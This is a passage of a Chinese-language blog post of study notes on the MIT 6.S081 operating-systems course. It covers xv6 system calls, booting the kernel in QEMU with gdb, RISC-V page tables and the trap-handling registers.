class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSGSIZE 16</span></span><br><span class="line"><span class="keyword">char</span>* msg1 = <span class="string">&quot;hello, world #1&quot;</span>;</span><br><span class="line"><span class="keyword">char</span>* msg2 = <span class="string">&quot;hello, world #2&quot;</span>;</span><br><span class="line"><span class="keyword">char</span>* msg3 = <span class="string">&quot;hello, world #3&quot;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> inbuf[MSGSIZE];</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">2</span>], i;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (pipe(p) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* continued */</span></span><br><span class="line">    <span class="comment">/* write pipe */</span></span><br><span class="line">  </span><br><span class="line">    write(p[<span class="number">1</span>], msg1, MSGSIZE);</span><br><span class="line">    write(p[<span class="number">1</span>], msg2, MSGSIZE);</span><br><span class="line">    write(p[<span class="number">1</span>], msg3, MSGSIZE);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="comment">/* read pipe */</span></span><br><span class="line">        read(p[<span class="number">0</span>], inbuf, MSGSIZE);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;% s\n&quot;</span>, inbuf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="exec，wait系统调用"><a href="#exec，wait系统调用" class="headerlink" title="exec，wait系统调用"></a>exec，wait系统调用</h3><p>系统调用 <code>exec</code> 将从某个文件（通常是可执行文件）里读取内存镜像，并将其替换到调用它的进程的内存空间，这样相当于丢弃了调用进程的内存，并开始执行新加载的指令。</p><p>通常来说exec系统调用不会返回，因为exec会完全替换当前进程的内存，相当于当前进程不复存在了，所以exec系统调用已经没有地方能返回了。所以shell的话会先fork，之后在子进程里进行exec</p><p><img src="/2022/07/07/6.s081/image-20220708142644161.png" alt="image-20220708142644161"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ forkexec</span><br><span class="line">parent waiting</span><br><span class="line">THIS IS ECHO</span><br><span class="line">child <span class="built_in">exit</span> status 0</span><br></pre></td></tr></table></figure><p>wait会等待之前创建的子进程退出(只能父等子进程)，其中的 status是子进程退出时的状态，正常退出的是0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;echoasasdf&quot;, argv);</span><br><span class="line">printf(&quot;exec failed!\n&quot;);</span><br><span class="line">exit(1111);</span><br><span class="line"></span><br><span class="line">$ forkexec</span><br><span class="line">parent waiting</span><br><span class="line">exec failed!</span><br><span class="line">child exit status 1111</span><br></pre></td></tr></table></figure><h1 id="Chapter3"><a href="#Chapter3" class="headerlink" title="Chapter3"></a>Chapter3</h1><blockquote><p>  <a href="https://zhayujie.com/mit6828-env.html">https://zhayujie.com/mit6828-env.html</a></p></blockquote><ol><li>隔离性（isolation）</li><li>防御性 (Defensive)</li><li>协同调度（Cooperative Scheduling）：在发现自己运行了一段时间之后，需要让别的程序也有机会能运行。这种机制有时候称为协同调度。</li><li>kernel mode：特殊权限指令主要是一些直接操纵硬件的指令和设置保护的指令，例如设置page table寄存器、关闭时钟中断。在处理器上有各种各样的状态，操作系统会使用这些状态，但是只能通过特殊权限指令来变更这些状态。</li></ol><p>RISC-V的模式其实是三种：（user&#x2F;kernel&#x2F;machine）</p><p>内核有时候也被称为可被信任的计算空间（Trusted Computing Base）</p><p>宏内核 vs 微内核 （Monolithic Kernel vs Micro Kernel）</p><p>宏内核：整个操作系统代码都运行在kernel mode。大多数的Unix操作系统实现都运行在kernel mode。比如，XV6中，所有的操作系统服务都在kernel mode中，这种形式被称为Monolithic Kernel Design。宏内核的优势在于，因为这些子模块现在都位于同一个程序中，它们可以紧密的集成在一起，这样的集成提供很好的性能。例如Linux，它就有很不错的性能。</p><p>微内核：希望在kernel mode中运行尽可能少的代码。所以这种设计下还是有内核，但是内核只有非常少的几个模块。</p><p>需要有一种方式能够让应用程序可以将控制权转移给内核（Entering Kernel）。</p><p>在RISC-V中，有一个专门的指令用来实现这个功能，叫做ECALL。ECALL接收一个数字参数，当一个用户程序想要将程序执行的控制权转移到内核，它只需要执行ECALL指令，并传入一个数字。这里的数字参数代表了应用程序想要调用的System Call。</p><p>可被信任的计算空间（Trusted Computing Base）TCB</p><p>IPC（Inter-Process Communication，进程间通信）</p><p>对于任何文件系统的交互，都需要分别完成2次用户空间&lt;-&gt;内核空间的跳转。与宏内核对比，在宏内核中如果一个应用程序需要与文件系统交互，只需要完成1次用户空间&lt;-&gt;内核空间的跳转，所以微内核的的跳转是宏内核的两倍。</p><h2 id="编译运行kernel"><a href="#编译运行kernel" class="headerlink" title="编译运行kernel"></a>编译运行kernel</h2><p>xv6为宏内核</p><p>kernel：包含所有内核文件，里所有的文件会被编译成一个叫做kernel的二进制文件，然后这个二进制文件会被运行在kernle mode中。</p><p>mkfs：它会创建一个空的文件镜像，我们会将这个镜像存在磁盘上，这样我们就可以直接使用一个空的文件系统。</p><p>编译内核过程：</p><ul><li>首先，Makefile（XV6目录下的文件）会读取一个C文件，例如proc.c；之后调用gcc编译器，生成一个文件叫做proc.s，这是RISC-V 汇编语言文件；之后再走到汇编解释器，生成proc.o，这是汇编语言的二进制格式。</li><li>Makefile会为所有内核文件做相同的操作。</li><li>之后，系统加载器（Loader）会收集所有的.o文件，将它们链接在一起，并生成内核文件。</li></ul><p>这里为了方便还会生成kernel.asm，包含了内核的完整汇编语言:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">kernel/kernel:     file format elf64-littleriscv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000080000000 &lt;_entry&gt;:</span><br><span class="line">    80000000:0000a117          auipcsp,0xa</span><br><span class="line">    80000004:83010113          addisp,sp,-2000 # 80009830 &lt;stack0&gt;</span><br><span class="line">    80000008:6505                luia0,0x1</span><br><span class="line">    8000000a:f14025f3          csrra1,mhartid</span><br><span class="line">    8000000e:0585                addia1,a1,1</span><br><span class="line">    80000010:02b50533          mula0,a0,a1</span><br><span class="line">    80000014:912a                addsp,sp,a0</span><br><span class="line">    80000016:070000ef          jalra,80000086 &lt;start&gt;</span><br><span class="line"></span><br><span class="line">000000008000001a &lt;spin&gt;:</span><br><span class="line">    8000001a:a001                j8000001a &lt;spin&gt;</span><br><span class="line"></span><br><span class="line">000000008000001c &lt;timerinit&gt;:</span><br><span class="line">// which arrive at timervec in kernelvec.S,</span><br><span class="line">// which turns them into software interrupts for</span><br><span class="line">// devintr() in trap.c.</span><br><span class="line">void</span><br><span class="line">timerinit()</span><br><span class="line">&#123;</span><br><span class="line">    8000001c:1141                addisp,sp,-16</span><br><span class="line">    8000001e:e422                sds0,8(sp)</span><br><span class="line">    80000020:0800                addis0,sp,16</span><br><span class="line">// which hart (core) is this?</span><br><span class="line">static inline uint64</span><br><span class="line">r_mhartid()</span><br><span class="line">&#123;</span><br><span class="line">.........</span><br></pre></td></tr></table></figure><p>可以看到第一个指令在0x80000000.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/xv6-labs-2020$ sudo make qemu</span><br><span class="line">qemu-system-riscv64 -machine virt -bios none -kernel kernel/kernel -m 128M -smp 3 -nographic -drive file=fs.img,<span class="keyword">if</span>=none,format=raw,id=x0 -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0</span><br><span class="line"></span><br><span class="line">xv6 kernel is booting</span><br><span class="line"></span><br><span class="line">hart 2 starting</span><br><span class="line">hart 1 starting</span><br><span class="line">init: starting sh</span><br><span class="line">$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>传给QEMU的几个参数：</p><ul><li>-kernel：这里传递的是内核文件（kernel目录下的kernel文件），这是将在QEMU中运行的程序文件。</li><li>-m：这里传递的是RISC-V虚拟机将会使用的内存数量</li><li>-smp：这里传递的是虚拟机可以使用的CPU核数</li><li>-drive：传递的是虚拟机使用的磁盘驱动，这里传入的是fs.img文件</li></ul><p>当我们说QEMU仿真了RISC-V处理器时，背后的含义：</p><p>直观来看，QEMU是一个大型的开源C程序，你可以下载或者git clone它。但是在内部，在QEMU的主循环中，只在做一件事情：</p><ul><li>读取4字节或者8字节的RISC-V指令。</li><li>解析RISC-V指令，并找出对应的操作码（op code）。我们之前在看kernel.asm的时候，看过一些操作码的二进制版本。通过解析，或许可以知道这是一个ADD指令，或者是一个SUB指令。</li><li>之后，在软件中执行相应的指令。</li></ul><h2 id="xv6启动过程"><a href="#xv6启动过程" class="headerlink" title="xv6启动过程"></a>xv6启动过程</h2><p>启动qemu，打开gdb：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/xv6-labs-2020$ sudo make CPUS=1 qemu-gdb </span><br><span class="line">*** Now run <span class="string">&#x27;gdb&#x27;</span> <span class="keyword">in</span> another window.</span><br><span class="line">qemu-system-riscv64 -machine virt -bios none -kernel kernel/kernel -m 128M -smp 1 -nographic -drive file=fs.img,<span class="keyword">if</span>=none,format=raw,id=x0 -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0 -S -gdb tcp::25000</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在xv6的目录再打开一个终端：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch kernel/kernel</span><br><span class="line"><span class="comment">#至于还要装什么我也忘了，鼓弄一下午，，，，fk</span></span><br></pre></td></tr></table></figure><p>常用gdb指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">layout split        # 同时打开源码及汇编窗口</span><br><span class="line">layout reg          # 打开寄存器窗口</span><br><span class="line">layout asm          # 打开汇编窗口</span><br><span class="line">next / nexti        # 单步到下一行 源代码 / 指令，不进入函数</span><br><span class="line">step / stepi        # 单步到下一行 源代码 / 指令，进入函数</span><br><span class="line">break (b)           # 设置断点，后面可接函数、行号、地址等</span><br><span class="line">continue (c)        # 继续执行到下一个断点</span><br></pre></td></tr></table></figure><p>进去之后断在_entry</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">Reading symbols from kernel/kernel...</span><br><span class="line">The target architecture is assumed to be riscv:rv64</span><br><span class="line">0x0000000000001000 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) b _entry</span><br><span class="line">Breakpoint 1 at 0x8000000a</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x000000008000000a <span class="keyword">in</span> _entry ()</span><br><span class="line">=&gt; 0x000000008000000a &lt;_entry+10&gt;:f3 25 40 f1csrra1,mhartid</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure><p>这里可以看到，XV6从entry.s开始启动，这个时候没有内存分页，没有隔离性，并且运行在M-mode（machine mode）。XV6会尽可能快的跳转到kernel mode或者说是supervisor mode。我们在main函数设置一个断点，main函数已经运行在supervisor mode了。接下来我运行程序，代码会在断点，也就是main函数的第一条指令停住。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b main</span><br><span class="line">Breakpoint 2 at 0x80000ec6: file kernel/main.c, line 13.</span><br></pre></td></tr></table></figure><p>进入 layout split 模式：</p><p><img src="/2022/07/07/6.s081/image-20211127204219036.png" alt="image-20211127204219036"></p><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(cpuid() == <span class="number">0</span>)&#123;</span><br><span class="line">    consoleinit();</span><br><span class="line">    printfinit();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;xv6 kernel is booting\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    kinit();         <span class="comment">// physical page allocator</span></span><br><span class="line">    kvminit();       <span class="comment">// create kernel page table</span></span><br><span class="line">    kvminithart();   <span class="comment">// turn on paging</span></span><br><span class="line">    procinit();      <span class="comment">// process table</span></span><br><span class="line">    trapinit();      <span class="comment">// trap vectors</span></span><br><span class="line">    trapinithart();  <span class="comment">// install kernel trap vector</span></span><br><span class="line">    plicinit();      <span class="comment">// set up interrupt controller</span></span><br><span class="line">    plicinithart();  <span class="comment">// ask PLIC for device interrupts</span></span><br><span class="line">    binit();         <span class="comment">// buffer cache</span></span><br><span class="line">    iinit();         <span class="comment">// inode cache</span></span><br><span class="line">    fileinit();      <span class="comment">// file table</span></span><br><span class="line">    virtio_disk_init(); <span class="comment">// emulated hard disk</span></span><br><span class="line">    userinit();      <span class="comment">// first user process</span></span><br><span class="line">    __sync_synchronize();</span><br><span class="line">    started = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(started == <span class="number">0</span>)</span><br><span class="line">      ;</span><br><span class="line">    __sync_synchronize();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hart %d starting\n&quot;</span>, cpuid());</span><br><span class="line">    kvminithart();    <span class="comment">// turn on paging</span></span><br><span class="line">    trapinithart();   <span class="comment">// install kernel trap vector</span></span><br><span class="line">    plicinithart();   <span class="comment">// ask PLIC for device interrupts</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  scheduler();        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有很多初始化的函数，顺序也很重要：</p><ul><li>kinit：设置好页表分配器（page allocator）</li><li>kvminit：设置好虚拟内存，这是下节课的内容</li><li>kvminithart：打开页表，也是下节课的内容</li><li>processinit：设置好初始进程或者说设置好进程表单</li><li>trapinit&#x2F;trapinithart：设置好user&#x2F;kernel mode转换代码</li><li>plicinit&#x2F;plicinithart：设置好中断控制器PLIC（Platform Level Interrupt Controller），我们后面在介绍中断的时候会详细的介绍这部分，这是我们用来与磁盘和console交互方式</li><li>binit：分配buffer cache</li><li>iinit：初始化inode缓存</li><li>fileinit：初始化文件系统</li><li>virtio_disk_init：初始化磁盘</li><li>userinit：最后当所有的设置都完成了，操作系统也运行起来了，会通过userinit运行第一个进程，这里有点意思，接下来我们看一下userinit</li></ul><p>跟userinit：</p><p><img src="/2022/07/07/6.s081/image-20211127204927777.png" alt="image-20211127204927777"></p><p>实际上initcode就是执行了exec(“&#x2F;init”)</p><p>断在syscall：</p><p><img src="/2022/07/07/6.s081/image-20211127205221097.png" alt="image-20211127205221097"></p><p><code>num = p-&gt;trapframe-&gt;a7;</code>读取使用的系统调用的整数，执行完：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p num</span><br><span class="line"><span class="variable">$1</span> = 7</span><br></pre></td></tr></table></figure><p><img src="/2022/07/07/6.s081/image-20211127205509797.png" alt="image-20211127205509797"></p><p>是exc系统调用。</p><p>之后的<code> p-&gt;trapframe-&gt;a0 = syscalls[num]();</code>执行系统调用，跟到syscalls中去：</p><p><img src="/2022/07/07/6.s081/image-20211127205923786.png" alt="image-20211127205923786"></p><p>sys_exec会从用户空间读取参数，它会读取path，也就是要执行程序的文件名。这里首先会为参数分配空间，然后从用户空间将参数拷贝到内核空间。</p><p>传入的是init程序，看下</p><p><img src="/2022/07/07/6.s081/image-20211127210234975.png" alt="image-20211127210234975"></p><p>init会为用户空间设置好一些东西，比如配置好console，调用fork，并在fork出的子进程中执行shell。</p><p>然后就可以在qemu中看到shell起来了</p><h1 id="Chapter4"><a href="#Chapter4" class="headerlink" title="Chapter4"></a>Chapter4</h1><p>页表，内存管理单元（Memory Management Unit）</p><p><img src="/2022/07/07/6.s081/image-20211128000721204.png" alt="image-20211128000721204"></p><p>page table保存在内存中，MMU只是会去查看page table，我们接下来会看到，page table比我们这里画的要稍微复杂一些。</p><p>当操作系统将CPU从一个应用程序切换到另一个应用程序时，同时也需要切换SATP寄存器中的内容，从而指向新的进程保存在物理内存中的地址对应表单。</p><p>RISC-V中，一个page是4KB。</p><p>首先对于虚拟内存地址，我们将它划分为两个部分，index和offset，index用来查找page，offset对应的是一个page中的哪个字节。</p><p>当MMU在做地址翻译的时候，通过读取虚拟内存地址中的index可以知道物理内存中的page号，将offset加上page的起始地址，就可以得到物理内存地址。</p><p>实际上，在我们使用的RSIC-V处理器上，并不是所有的64bit都被使用了，也就是说高25bit并没有被使用。这样的结果是限制了虚拟内存地址的数量，虚拟内存地址的数量现在只有2^39个，大概是512GB。</p><p>在剩下的39bit中，有27bit被用来当做index，12bit被用来当做offset。offset必须是12bit，因为对应了一个page的4096个字节。</p><p>在RISC-V中，物理内存地址是56bit。其中44bit是物理page号（PPN，Physical Page Number），剩下12bit是offset完全继承自虚拟内存地址（也就是地址转换时，只需要将虚拟内存中的27bit翻译成物理内存中的44bit的page号，剩下的12bitoffset直接拷贝过来即可）。</p><p>实际上page table是一个多级的结构，下图是一个真正的RISC-V page table结构和硬件实现。3级结构是由硬件实现而不是系统。</p><p><img src="/2022/07/07/6.s081/image-20211128001754166.png" alt="image-20211128001754166"></p><p>27bit的index，实际上是由3个9bit的数字组成（L2，L1，L0）。前9个bit被用来索引最高级的page directory。Directory中的一个条目被称为PTE（Page Table Entry）是64bits，就像寄存器的大小一样，也就是8Bytes。所以一个Directory page有512个条目。</p><p>实际上，SATP寄存器会指向最高一级的page directory的物理内存地址，之后我们用虚拟内存中index的高9bit用来索引最高一级的page directory，这样我们就能得到一个PPN，也就是物理page号。这个PPN指向了中间级的page directory。</p><p>当我们在使用中间级的page directory时，我们通过虚拟内存地址中的L1部分完成索引。接下来会走到最低级的page directory，我们通过虚拟内存地址中的L0部分完成索引。在最低级的page directory中，我们可以得到对应于虚拟内存地址的物理内存地址。</p><p>之前的方案要用到2^27个PTE，现在这个方案中，只需要3 * 512个PTE，大大减少</p><p>接下来看看PTE中的Flag。每个PTE的低10bit是一堆标志位：</p><ul><li>第一个标志位是Valid。如果Valid bit位为1，那么表明这是一条合法的PTE，你可以用它来做地址翻译。对于刚刚举得那个小例子（应用程序只用了1个page的例子），我们只使用了3个page directory，每个page directory中只有第0个PTE被使用了，所以只有第0个PTE的Valid bit位会被设置成1，其他的511个PTE的Valid bit为0。这个标志位告诉MMU，你不能使用这条PTE，因为这条PTE并不包含有用的信息。</li><li>下两个标志位分别是Readable和Writable。表明你是否可以读&#x2F;写这个page。</li><li>Executable表明你可以从这个page执行指令。</li><li>User表明这个page可以被运行在用户空间的进程访问。</li><li>其他标志位并不是那么重要。</li></ul><p>这里还会用到页表缓存（Translation Lookaside Buffer）：对于一个虚拟内存地址的寻址，需要读三次内存，这里代价有点高。所以实际中，几乎所有的处理器都会对于最近使用过的虚拟地址的翻译结果有缓存。</p><p>接下来看XV6中，page table是如何工作的。</p><p>下图就是内核中地址的对应关系，左边是内核的虚拟地址空间，右边上半部分是物理内存或者说是DRAM，右边下半部分是I&#x2F;O设备。</p><p><img src="/2022/07/07/6.s081/image-20211128230803818.png" alt="image-20211128230803818"></p><p>或者说是这样：</p><p><img src="/2022/07/07/6.s081/image-20211128230837614.png" alt="image-20211128230837614"></p><p>上面那个图的右侧，地址0x1000是boot ROM的物理地址，当你对主板上电，主板做的第一件事情就是运行存储在boot ROM中的代码，当boot完成之后，会跳转到地址0x80000000。</p><p>其他的一些IO设备：</p><ul><li>PLIC是中断控制器（Platform-Level Interrupt Controller）。</li><li>CLINT（Core Local Interruptor）也是中断的一部分。所以多个设备都能产生中断，需要中断控制器来将这些中断路由到合适的处理函数。</li><li>UART0（Universal Asynchronous Receiver&#x2F;Transmitter）负责与Console和显示器交互。</li><li>VIRTIO disk，与磁盘进行交互。</li></ul><p>低于0x80000000的物理地址，不存在于DRAM中，当我们在使用这些地址的时候，指令会直接走向其他的硬件。</p><p>有一些page在虚拟内存中的地址很靠后，比如kernel stack在虚拟内存中的地址就很靠后。这是因为在它之下有一个未被映射的Guard page，这个Guard page对应的PTE的Valid 标志位没有设置，这样，如果kernel stack耗尽了，它会溢出到Guard page，但是因为Guard page的PTE中Valid标志位未设置，会导致立即触发page fault，这样的结果好过内存越界之后造成的数据混乱。立即触发一个panic（也就是page fault），你就知道kernel stack出错了。同时我们也又不想浪费物理内存给Guard page，所以Guard page不会映射到任何物理内存，它只是占据了虚拟地址空间的一段靠后的地址。</p><p>同时，kernel stack被映射了两次，在靠后的虚拟地址映射了一次，在PHYSTOP下的Kernel data中又映射了一次，但是实际使用的时候用的是上面的部分，因为有Guard page会更加安全。</p><p>该跟着调4.6了</p><p>这里应该先跳过了，先干后面的。</p><h2 id="kvminit函数"><a href="#kvminit函数" class="headerlink" title="kvminit函数"></a>kvminit函数</h2><p><img src="/2022/07/07/6.s081/image-20220709140553688.png" alt="image-20220709140553688"></p><p>首先分配物理page，就是kalloc那里，之后初始化内存为0，之后将每个I&#x2F;O设备映射到内核，</p><p>在memlayout.h中，可以看到映射地址：<img src="/2022/07/07/6.s081/image-20220709140815091.png" alt="image-20220709140815091"></p><p>通过kvmmap可以将物理地址映射到相同的虚拟地址（注，因为kvmmap的前两个参数一致）</p><h1 id="Chapter5"><a href="#Chapter5" class="headerlink" title="Chapter5"></a>Chapter5</h1><blockquote><p>  导读：<a href="https://pdos.csail.mit.edu/6.828/2020/readings/riscv-calling.pdf">https://pdos.csail.mit.edu/6.828/2020/readings/riscv-calling.pdf</a></p></blockquote><p>这里用到的asm不是x86而是RISC-V，精简指令集（诞生于uc berkeley），而x86是复杂是复杂指令集CISC。</p><p>RISC指令集开源相关文档在课程页可找到，包含特殊权限指令和普通指令。相比x86的文档小了很多。</p><blockquote><p>  5.3的一些图片被删了，commit里面可以找到：<a href="https://github.com/huihongxiao/MIT6.S081/commit/6e5a0d8c2a3840bc9d3a8a381ff491567f1f9ee9%E3%80%82">https://github.com/huihongxiao/MIT6.S081/commit/6e5a0d8c2a3840bc9d3a8a381ff491567f1f9ee9。</a></p></blockquote><p>用到的RISC指令：</p><p><img src="/2022/07/07/6.s081/image-20211129172038380.png"></p><p>然后是stack相关的内容，和之前pwn的内容重合，就不写了，但是里面一些gdb的指令还是可以看看的。</p><p>在gdb中输入layout asm，可以在tui窗口看到所有的汇编指令。再输入layout reg可以看到所有的寄存器信息。</p><h1 id="Chapter6"><a href="#Chapter6" class="headerlink" title="Chapter6"></a>Chapter6</h1><blockquote><p>  导读：阅读【1】中第4章，除了4.6；阅读RISCV.h【2】；阅读trampoline.S【3】；阅读trap.c【4】</p><p>  【1】<a href="https://pdos.csail.mit.edu/6.828/2020/xv6/book-riscv-rev1.pdf">https://pdos.csail.mit.edu/6.828/2020/xv6/book-riscv-rev1.pdf</a></p><p>  【2】<a href="https://github.com/mit-pdos/xv6-riscv/blob/riscv/kernel/riscv.h">https://github.com/mit-pdos/xv6-riscv/blob/riscv/kernel/riscv.h</a></p><p>  【3】<a href="https://github.com/mit-pdos/xv6-riscv/blob/riscv/kernel/trampoline.S">https://github.com/mit-pdos/xv6-riscv/blob/riscv/kernel/trampoline.S</a></p><p>  【4】<a href="https://github.com/mit-pdos/xv6-riscv/blob/riscv/kernel/trap.c">https://github.com/mit-pdos/xv6-riscv/blob/riscv/kernel/trap.c</a></p></blockquote><p>RISC-V总共有32个比如a0，a1这样的寄存器，用户应用程序可以使用全部的寄存器。</p><p>一些重要的寄存器介绍：</p><ul><li><code>stvec</code>：内核在这里写入其陷阱处理程序的地址；RISC-V跳转到这里处理陷阱。</li><li><code>sepc</code>：当发生陷阱时，RISC-V会在这里保存程序计数器<code>pc</code>（因为<code>pc</code>会被<code>stvec</code>覆盖）。<code>sret</code>（从陷阱返回）指令会将<code>sepc</code>复制到<code>pc</code>。内核可以写入<code>sepc</code>来控制<code>sret</code>的去向。</li><li><code>scause</code>： RISC-V在这里放置一个描述陷阱原因的数字。</li><li><code>sscratch</code>：内核在这里放置了一个值，这个值在陷阱处理程序一开始就会派上用场。</li><li><code>sstatus</code>：其中的<strong>SIE</strong>位控制设备中断是否启用。如果内核清空<strong>SIE</strong>，RISC-V将推迟设备中断，直到内核重新设置<strong>SIE</strong>。<strong>SPP</strong>位指示陷阱是来自用户模式还是管理模式，并控制<code>sret</code>返回的模式。</li></ul><h2 id="trap的执行流程"><a href="#trap的执行流程" class="headerlink" title="trap的执行流程"></a>trap的执行流程</h2><p>这里使用write来举例，ecall执行系统调用，ecall后会切换到内核，内核中执行的第一个指令是一个由汇编语言写的函数，叫做<code>uservec</code>（<code>trampoline.s</code>），执行完后会跳到<code>usertrap</code>(<code>trap.c</code>)，<code>usertrap</code>中会执行<code>syscall</code>，<code>syscall</code>会在一个表单中，根据传入的代表系统调用的数字进行查找，并在内核中执行具体实现了系统调用功能的函数。</p><p>之后会输出内容到终端，完成后返回到<code>syscall</code>，再之后回复user空间代码，<code>syscall</code>中调用了<code>usertrapret</code>(<code>trap.c</code>)，<code>usertrapret</code>完成了部分方便在C代码中实现的返回到用户空间的工作，剩下的一些工作由汇编完成，即<code>userret</code>（<code>trampoline.s</code>），完成后会返回到用户空间继续执行用户代码。</p><blockquote><p>  vm.c运行在kernel mode下。</p></blockquote><h2 id="ECALL指令之前状态"><a href="#ECALL指令之前状态" class="headerlink" title="ECALL指令之前状态"></a>ECALL指令之前状态</h2><p><code>sh.c</code>:</p><figure class="highlight 